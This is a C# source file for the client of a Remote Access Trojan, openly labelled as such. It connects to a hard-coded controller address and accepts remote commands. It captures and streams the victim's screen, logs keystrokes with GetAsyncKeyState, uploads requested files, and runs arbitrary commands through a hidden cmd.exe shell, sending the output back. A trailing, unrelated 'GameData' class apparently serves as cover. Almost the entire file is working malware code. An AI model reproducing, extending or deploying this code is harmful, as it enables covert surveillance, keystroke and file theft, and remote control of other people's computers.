// Client side of the RAT (Remote Access Trojan) application

using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Collections.Generic;
using System.Diagnostics;

class Client
{

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount); 
    static void Main()
    {
        string serverIP = "192.168.28.230";
        int port = 8888;

        Console.WriteLine("[Client] Trying to connect...");

        try
        {
            using (TcpClient client = new TcpClient(serverIP, port))
            {
                Console.WriteLine("[Client] Connected successfully!");

                using (NetworkStream stream = client.GetStream())
                {
                    // 1. Get the local IP address being used for this connection and send it immediately
                    string localIP = ((IPEndPoint)client.Client.LocalEndPoint).Address.ToString();
                    SendIPAddress(stream, localIP);
                    Console.WriteLine($"[Client] Sent local IP identification: {localIP}");

                    byte[] buffer = new byte[1024];
                    bool isStreaming = false;
                    bool isLoging = false;

                    while (true)
                    {
                        if (stream.DataAvailable || (!isStreaming && !isLoging))
                        {
                            int bytesRead = stream.Read(buffer, 0, buffer.Length);
                            if (bytesRead == 0) break;


                            string commandUpper = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                            string incomingCommand = commandUpper.ToLower();
                            Console.WriteLine("[Client] Received Command: " + incomingCommand);

                            if (incomingCommand == "exit")
                                break;

                            else if (incomingCommand == "screenshot")
                            {
                                SendScreenshot(stream);
                            }

                            else if (incomingCommand == "streammode")
                            {
                                isStreaming = true;
                                Console.WriteLine("[Client] Stream Mode Activated.");
                            }

                            else if (incomingCommand == "keylog")
                            {
                                isLoging=true;
                                Console.WriteLine("[Client] KeyLog mode activated");
                            }

                            else if (incomingCommand == "stop")
                            {
                                isStreaming = false;
                                isLoging = false;
                                Console.WriteLine("[Client] Stream Mode Deactivated.");
                            }

                            else if (incomingCommand.StartsWith("requestFile ", StringComparison.OrdinalIgnoreCase))
                            {
                                Console.WriteLine("Requested file: " + incomingCommand);
                                try
                                {
                                    string[] parts = incomingCommand.Split(new char[] { ' ' }, 2);

                                    if (parts.Length == 2)
                                    {
                                        string fileName = parts[1].Trim();

                                        Console.WriteLine("Requested file: " + fileName);

                                        SendFile(stream, fileName);
                                    }
                                    else
                                    {
                                        Console.WriteLine("Missing file name.");
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine("[Client] ERROR:");
                                    Console.WriteLine(ex.ToString());
                                }
                            }
                            else{
                                Console.WriteLine("[Client] Unknown command received, running it in the shell: " + incomingCommand);
                                try
                                {
                                    string result = Client.Execute(commandUpper);
                                    SendString(stream, result);
                                    Console.WriteLine("[Client] Command Result: " + result);
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine("[Client] ERROR:");
                                    Console.WriteLine(ex.ToString());
                                }
                            }
                        }

                        if (isStreaming ||  isLoging)
                        {
                            if (isStreaming)
                            {
                                SendScreenshot(stream);
                                System.Threading.Thread.Sleep(1000); 
                            }
                            if (isLoging)
                            {
                                SendKeys(stream);
                                System.Threading.Thread.Sleep(100);
                            }
                        }
                        else
                        {
                            System.Threading.Thread.Sleep(10);
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[Client] Error: " + ex.Message);
        }

        Console.WriteLine("[Client] Disconnected.");
    }

    // Helper method to send the string IP address over the stream with a size prefix
    private static void SendIPAddress(NetworkStream stream, string ip)
    {
        byte[] ipBytes = Encoding.UTF8.GetBytes(ip);
        byte[] sizeHeader = BitConverter.GetBytes(ipBytes.Length);
        stream.Write(sizeHeader, 0, sizeHeader.Length);
        stream.Write(ipBytes, 0, ipBytes.Length);
        stream.Flush();
    }

    public static void SendFile(NetworkStream stream, string filePath)
    {
        string fileName = Path.GetFileName(filePath);

        byte[] nameBytes = Encoding.UTF8.GetBytes(fileName);
        byte[] nameLength = BitConverter.GetBytes(nameBytes.Length);

        FileInfo fi = new FileInfo(filePath);
        byte[] fileSize = BitConverter.GetBytes(fi.Length);

        // Send metadata
        stream.Write(nameLength, 0, nameLength.Length);
        stream.Write(nameBytes, 0, nameBytes.Length);
        stream.Write(fileSize, 0, fileSize.Length);

        // Send file contents
        using (FileStream fs = File.OpenRead(filePath))
        {
            byte[] buffer = new byte[8192];
            int read;

            while ((read = fs.Read(buffer, 0, buffer.Length)) > 0)
            {
                stream.Write(buffer, 0, read);
            }
        }

        stream.Flush();
    }

    private static void SendScreenshot(NetworkStream stream)
    {
        try
        {
            byte[] imageBytes = CaptureToMemory();
            byte[] sizeHeader = BitConverter.GetBytes(imageBytes.Length);
            
            stream.Write(sizeHeader, 0, sizeHeader.Length);
            stream.Write(imageBytes, 0, imageBytes.Length);

            Console.WriteLine($"[Client] Screenshot sent successfully. Size: {imageBytes.Length} bytes.");

            stream.Flush();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Error] Screenshot failed: {ex.Message}");
            try
            {
                byte[] errBytes = Encoding.UTF8.GetBytes("ERROR: " + ex.Message);
                byte[] sizeHeader = BitConverter.GetBytes(errBytes.Length);
                stream.Write(sizeHeader, 0, sizeHeader.Length);
                stream.Write(errBytes, 0, errBytes.Length);
                stream.Flush();
            }
            catch {}
        }
    }

    private static void SendKeys(NetworkStream stream)
    {
        try
        {
            int chars = 256; // Le nombre maximum de caractères
            StringBuilder buff = new StringBuilder(chars);

            IntPtr handle = GetForegroundWindow();
            List<System.Windows.Forms.Keys> dataList = new List<System.Windows.Forms.Keys>();
    
            if (GetWindowText(handle, buff, chars) > 0)
            
            {
            
                string line = buff.ToString();
            
                
                for (int i = 0; i < 255; i++)
                {
                    short state = GetAsyncKeyState(i);

                    if (state == 1 || state == -32767)
                    {
                        dataList.Add((Keys)i);
                    }
                }
            
            }

            System.Windows.Forms.Keys[] dataArray = dataList.ToArray();

            byte[] arrayLengthHeader = BitConverter.GetBytes(dataArray.Length);
            stream.Write(arrayLengthHeader, 0, arrayLengthHeader.Length);

            // 3. Loop through each string and send it dynamically
            foreach (System.Windows.Forms.Keys element in dataArray)
            {
                // Convert the string to raw UTF-8 bytes
                byte[] elementBytes = Encoding.UTF8.GetBytes(element.ToString());
                
                // Get the byte size of this specific string (4 bytes)
                byte[] elementSizeHeader = BitConverter.GetBytes(elementBytes.Length);

                // Write the size prefix, followed immediately by the string contents
                stream.Write(elementSizeHeader, 0, elementSizeHeader.Length);
                stream.Write(elementBytes, 0, elementBytes.Length);
            }

            stream.Flush();
            Console.WriteLine($"[Client] Successfully sent array containing {dataArray.Length} items.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Error] Screenshot failed: {ex.Message}");
            try
            {
                byte[] errBytes = Encoding.UTF8.GetBytes("ERROR: " + ex.Message);
                byte[] sizeHeader = BitConverter.GetBytes(errBytes.Length);
                stream.Write(sizeHeader, 0, sizeHeader.Length);
                stream.Write(errBytes, 0, errBytes.Length);
                stream.Flush();
            }
            catch {}
        }
    }

    public static byte[] CaptureToMemory()
    {
        Rectangle bounds = Screen.PrimaryScreen.Bounds;
        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb))
        {
            using (Graphics g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            }
            using (MemoryStream ms = new MemoryStream())
            {
                bitmap.Save(ms, ImageFormat.Png);
                return ms.ToArray();
            }
        }
    }

    private static string currentDirectory = Directory.GetCurrentDirectory();
    public static string Execute(string command)
    {
        try
        {
            command = command.Trim();

            if (string.IsNullOrEmpty(command))
                return "";

            // Handle cd ourselves
            if (command.Equals("cd", StringComparison.OrdinalIgnoreCase))
                return currentDirectory;

            if (command.StartsWith("cd ", StringComparison.OrdinalIgnoreCase))
            {
                string path = command.Substring(3).Trim();

                string newPath;

                if (Path.IsPathRooted(path))
                {
                    newPath = path;
                }
                else
                {
                    newPath = Path.GetFullPath(
                        Path.Combine(currentDirectory, path)
                    );
                }

                if (!Directory.Exists(newPath))
                    return "Directory not found: " + newPath;

                currentDirectory = newPath;
                return currentDirectory;
            }

            ProcessStartInfo psi = new ProcessStartInfo();

            psi.FileName = "cmd.exe";
            psi.Arguments = "/C " + command;

            psi.WorkingDirectory = currentDirectory;

            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;

            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (Process process = Process.Start(psi))
            {
                if (process == null)
                    return "Failed to start process.";

                string stdout = process.StandardOutput.ReadToEnd();
                string stderr = process.StandardError.ReadToEnd();

                process.WaitForExit();

                return stdout + stderr;
            }
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
    public static void SendString(NetworkStream stream, string str)
    {
        Console.WriteLine("[Client] Preparing to send string: " + str);
        try
        {
            byte[] payload = Encoding.UTF8.GetBytes(str);
            byte[] length = BitConverter.GetBytes(payload.Length);

            stream.Write(length, 0, length.Length);
            stream.Write(payload, 0, payload.Length);

            Console.WriteLine("[Client] String sent successfully. Size: " + payload.Length + " bytes.");

            stream.Flush();
        }
        catch (Exception ex)
        {
            Console.WriteLine("[Error] String failed: " + ex.Message);

            try
            {
                byte[] errBytes = Encoding.UTF8.GetBytes("ERROR: " + ex.Message);
                byte[] sizeHeader = BitConverter.GetBytes(errBytes.Length);

                stream.Write(sizeHeader, 0, sizeHeader.Length);
                stream.Write(errBytes, 0, errBytes.Length);
                stream.Flush();
            }
            catch {}
        }
    }
}

public class GameData
{
    public int Score { get; set; }
    public string PlayerName { get; set; }
    public bool IsActive { get; set; }
}